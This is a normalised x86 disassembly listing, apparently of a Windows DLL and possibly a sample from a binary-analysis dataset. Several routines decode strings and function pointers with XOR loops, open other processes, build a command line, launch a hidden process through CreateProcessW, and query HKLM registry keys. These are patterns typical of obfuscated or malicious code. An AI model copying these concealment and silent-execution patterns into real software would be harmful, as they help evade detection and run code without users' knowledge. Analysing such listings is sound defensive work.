mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1004091d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1007f940
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_100388df
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_100388df
pop ecx
sub_10040a46
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1005c9e0
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10040a77
push 0x5c
mov eax sub_10085c36
call sub_1003fae8
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1005c1c5
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1004a330
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10067e0a
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_100627b5
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_100103de
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1003c519
mov eax [ ebp - 0x60 ]
call sub_1004642f
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1004a330
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10067e0a
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_10040ba0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
cmp ecx 0x8
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10041880
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea eax [ eax + edi * 2 ]
cmp eax edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor edx edx
mov [ eax ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
sar edx 0x1
push edx
push esi
mov ecx esi
call sub_10017b50
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
pop ebx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea ecx [ ebx + ebx ]
push ecx
push edx
mov edx [ esi + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10040cc0
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x98 ] ebx
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x52
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x98 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx ebx
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x2
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] ebx
call sub_1006a2d0
test eax eax
je r-xdata
push esi
mov esi [ ebp - 0xa0 ]
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x94 ]
xor eax eax
call sub_10053240
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
mov [ ebp - 0x9c ] 0x3
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x44 ]
mov eax 0x106
call sub_10053240
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
mov [ ebp - 0x9c ] 0x4
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
add edi 0x120
call sub_1006fd00
mov ebx [ esi + 0x4 ]
call sub_1006b3f0
call sub_1006c7f0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10040e40
push ebp
mov ebp esp
sub esp 0xb10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
push eax
call [ StrToIntW@IAT ]
mov edi eax
push edi
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x104
lea eax [ ebp - 0x28c ]
push eax
push 0x0
push esi
call [ GetModuleFileNameExW@IAT ]
test eax eax
push esi
mov al 0x38
jne r-xdata
lea eax [ esi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ ebp - 0xab0 ] edx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xab0 ] ecx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28c ]
push eax
call [ PathQuoteSpacesW@IAT ]
lea edx [ ebp - 0x7c ]
mov eax 0xa1
call sub_10045930
mov ecx edx
push ecx
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x8a4 ]
call sub_10072800
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0x128
call sub_10045930
push edi
push edx
mov eax 0x16
lea ebx [ ebp - 0x4c ]
call sub_1006a1a0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4c ]
push eax
lea esi [ ebp - 0x8a4 ]
call sub_1001f4b0
test eax eax
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x74 ]
mov eax 0x11f
call sub_10045930
mov ecx edx
push ecx
lea esi [ ebp - 0x8a4 ]
call sub_1001f4b0
test eax eax
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28c ]
push edx
lea esi [ ebp - 0x8a4 ]
call sub_1001f4b0
test eax eax
je r-xdata
mov eax 0x8
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov eax 0x12f
call sub_10045930
mov eax edx
push eax
lea esi [ ebp - 0x8a4 ]
call sub_1001f4b0
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x34 ]
mov eax 0x96
call sub_10045930
push 0x104
lea ecx [ ebp - 0xaac ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x44
lea eax [ ebp - 0xb0c ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
xor eax eax
lea ecx [ ebp - 0xac0 ]
push ecx
lea edx [ ebp - 0xb0c ]
push edx
push eax
push eax
push 0x8000000
push eax
push eax
push eax
mov [ ebp - 0xac0 ] eax
mov [ ebp - 0xabc ] eax
mov [ ebp - 0xab8 ] eax
mov [ ebp - 0xab4 ] eax
lea eax [ ebp - 0x8a4 ]
push eax
lea ecx [ ebp - 0xaac ]
push ecx
mov [ ebp - 0xb0c ] 0x44
call [ CreateProcessW@IAT ]
mov ecx [ ebp - 0x8 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffff4
pop esi
xor ecx ebp
add eax 0xc
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0xb
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10041140
push ebp
mov ebp esp
push 0xffffffff
push sub_1008697b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_100120f0
lea ecx [ ebp - 0x20 ]
push ecx
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10024a46
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] eax
jmp r-xdata
sub_10041240
push ebp
mov ebp esp
push 0xffffffff
push sub_10086ca9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x18 ]
push eax
call sub_10065cb8
mov ecx [ ebp - 0x18 ]
mov eax 0x51eb851f
mul ecx
mov eax edx
shr eax 0x3
mov dl 0x19
imul dl
sub cl al
mov eax [ esi + 0x10 ]
add esp 0x4
lea ebx [ ecx + 0x41 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
jbe r-xdata
push r--data
call sub_1000831a
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
jmp r-xdata
setne al
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
test edi edi
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
cmp eax [ ebp + 0xc ]
jb r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax ] 0x0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ eax + edi ] 0x0
sub_10041358
push 0x4c
mov eax sub_100860b6
call sub_1003fae8
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] edx
call sub_1004f558
lea eax [ ebp + 0x14 ]
xor ebx ebx
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
or [ edi ] 0x1
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005c1f0
mov eax [ ebp - 0x2c ]
xor esi esi
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] 0x30
jl r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call sub_1002c8c0
mov eax esi
call sub_1004642f
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1004ca10
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
cmp [ eax ] 0x39
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
movzx eax [ eax + esi ]
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1004ca10
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_10024441
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov esi [ ebp - 0x58 ]
sub_10041486
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10041a47
pop ecx
push eax
call sub_10057f6e
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100414f0
push ebp
mov ebp esp
sub esp 0x2b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x44 ]
push edx
push 0x80000002
mov [ ebp - 0x12 ] ax
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x5
call sub_100367b0
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x2ac ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2a8 ]
[ edi ]
lea edx [ ebp - 0x68 ]
mov eax 0x9
mov [ ebp - 0x2b0 ] 0x206
call sub_100367b0
lea eax [ ebp - 0x2b0 ]
push eax
mov eax [ ebp - 0x2ac ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
pop edi
test eax eax
je r-xdata
lea edx [ ebp - 0x2a8 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x27
call sub_100367b0
mov eax edx
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call sub_1005f3a1
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov edx [ ebp - 0x2ac ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ RegCloseKey@IAT ]
sub_1004166b
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100083d4
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10041710
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x38 ] dx
lea edx [ ebp - 0x10 ]
mov eax 0x2a
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x30 ] 0x1
call sub_10053240
mov ebx [ ebp - 0x38 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x34 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x30 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x2c ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
push edx
mov edx [ ebp - 0x20 ]
mov ecx edi
xor ebx ebx
call sub_10058130
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ ebp - 0x14 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov ebx 0x3
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
je r-xdata
lea ebx [ edi + 0x6 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x1c ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x18 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
push eax
call sub_100453a0
mov ecx [ ebp - 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov ebx 0x4
jmp r-xdata
sub_10041880
push ebp
mov ebp esp
push 0xffffffff
push sub_100869a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] 0x0
call sub_10069ac6
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_10024fe9
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1006a460
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
